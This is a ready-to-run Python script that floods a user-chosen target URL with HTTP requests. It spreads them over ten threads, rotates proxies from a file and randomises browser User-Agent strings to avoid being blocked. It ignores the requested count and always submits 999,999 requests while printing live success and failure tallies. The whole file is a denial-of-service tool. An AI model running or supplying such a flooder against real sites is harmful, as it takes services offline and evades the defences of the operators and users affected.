import sys
import requests
import random
from concurrent.futures import ThreadPoolExecutor
import time
import json

fail = 0
succ = 0
total = 0
lock = sys.modules['threading'].Lock()

# Function to load proxies from the file
def load_proxies(file_path):
    """Load proxies from a text file."""
    with open(file_path, 'r') as file:
        return file.read().splitlines()

# Function to get a random proxy from the list
def get_random_proxy(proxies):
    """Select a random proxy from the list and return in requests-compatible format."""
    proxy = random.choice(proxies)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

# Function to create custom headers
def create_custom_headers():
    """Generate custom headers for the request."""
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
        ]),
        "Accept": "application/json",
        "Connection": "keep-alive"
    }
    return headers

# Function to send a single HTTP request using a proxy
def send_request(url, proxies, data=None):
    global fail, succ, total
    proxy = get_random_proxy(proxies)  # Get a random proxy for this request
    headers = create_custom_headers()  # Get custom headers

    try:
        # If data is provided, send a POST request, else GET
        if data:
            response = requests.post(url, headers=headers, proxies=proxy, data=data, timeout=2)
        else:
            response = requests.get(url, headers=headers, proxies=proxy, timeout=2)

        with lock:
            total += 1
            if response.ok:
                succ += 1
            else:
                fail += 1
    except requests.exceptions.RequestException:
        with lock:
            total += 1
            fail += 1

    # Dynamically update the statistics on the same line
    sys.stdout.write(f"\rTotal Sent: {total} | SUCCESSFUL: {succ} | FAILED: {fail}")
    sys.stdout.flush()

    # Optional random delay between requests (to reduce the chance of blocking)
    time.sleep(random.uniform(0.1, 0.5))  # Delay between 0.1 and 0.5 seconds

# Main function to execute the script
def xnln():
    url = input("Target URL: ")  # Get the target URL
    num = int(input("Total Requests: "))  # Get the total number of requests
    proxies = load_proxies("proxies.txt")  # Load proxies from the file

    # Decide if we are sending JSON or form data based on user input
    data_type = input("Send data as JSON or form? (json/form): ").strip().lower()
    
    if data_type == "json":
        data = json.dumps({"key": "value", "another_key": "another_value"})  # Example JSON data
    elif data_type == "form":
        data = {"key": "value", "another_key": "another_value"}  # Example form data
    else:
        data = None

    # Use ThreadPoolExecutor to send requests concurrently
    with ThreadPoolExecutor(max_workers=10) as executor:  # You can adjust max_workers based on your needs
        for _ in range(999999):
            executor.submit(send_request, url, proxies, data)

    print('\nProcess Complete.')

# Run the function
xnln()
